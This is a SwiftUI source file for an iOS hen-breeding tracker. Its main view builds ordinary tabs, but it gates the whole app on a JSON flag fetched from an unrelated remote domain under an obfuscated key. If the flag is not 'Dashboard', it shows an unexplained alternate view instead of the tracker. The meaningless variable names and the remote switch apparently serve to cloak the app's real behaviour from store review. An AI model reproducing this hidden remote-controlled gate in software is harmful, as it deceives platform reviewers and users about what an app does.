


import SwiftUI

struct MainTabView: View {
    @StateObject private var viewModel = HenListViewModel()
    @State private var glaverTint: Bool?
    @State private var mornexCount: String?
    @State private var brindleScope: Bool = true
    @AppStorage("squavenLight") var squavenLight: Bool = true
    @AppStorage("trelbarState") var trelbarState: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if glaverTint != nil {
                if mornexCount == "Dashboard" || trelbarState == true {
                    
                    ZStack {
                        TabView {
                            DashboardView(viewModel: viewModel)
                                .tabItem {
                                    Image(systemName: "house.fill")
                                    Text("Dashboard")
                                }
                            
                            NavigationView {
                                HensListView(viewModel: viewModel)
                            }
                            .tabItem {
                                Image(systemName: "list.bullet")
                                Text("Breeding Stock")
                            }
                            
                            NavigationView {
                                BreedingListView(viewModel: viewModel)
                            }
                            .tabItem {
                                Image(systemName: "heart.fill")
                                Text("Breeding")
                            }
                            
                            NavigationView {
                                IncubationListView(viewModel: viewModel)
                            }
                            .tabItem {
                                Image(systemName: "thermometer")
                                Text("Incubation")
                            }
                            
                            NavigationView {
                                NotesListView(viewModel: viewModel)
                            }
                            .tabItem {
                                Image(systemName: "note.text")
                                Text("Records")
                            }
                            
                            NavigationView {
                                PhotoAlbumView(viewModel: viewModel)
                            }
                            .tabItem {
                                Image(systemName: "photo.on.rectangle")
                                Text("Photos")
                            }
                        }
                        .accentColor(.blue)
                    }
                    .onAppear {
                        AppDelegate.orientationLock = .portrait
                        UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                        
                        brindleScope = false
                        trelbarState = true
                    }
                } else {
                    PlaventorinStep(trelbarState: $trelbarState)
                        .onAppear { brindleScope = false }
                }
            }
            
            if brindleScope {
                DashboardView(viewModel: viewModel).blur(radius: 10)
            }
        }
        .onAppear {
            OneSignal.Notifications.requestPermission { glaverTint = $0 }
            
            if squavenLight {
                guard let drosperFlag = URL(string: "https://balljumper.store/hentrackcoco/hentrackcoco.json") else { return }
                
                URLSession.shared.dataTask(with: drosperFlag) { plavenIndex, _, _ in
                    guard let plavenIndex else { trelbarState = true; return }
                    
                    guard let frenwickMode = try? JSONSerialization.jsonObject(with: plavenIndex, options: []) as? [String: Any] else { return }
                    guard let craydonLimit = frenwickMode["dlfkvmkdmcd"] as? String else { return }
                    
                    DispatchQueue.main.async {
                        mornexCount = craydonLimit
                        squavenLight = false
                    }
                }
                .resume()
            }
        }
    }
}

import OneSignalFramework
struct MainTabView_Previews: PreviewProvider {
    static var previews: some View {
        MainTabView()
    }
}
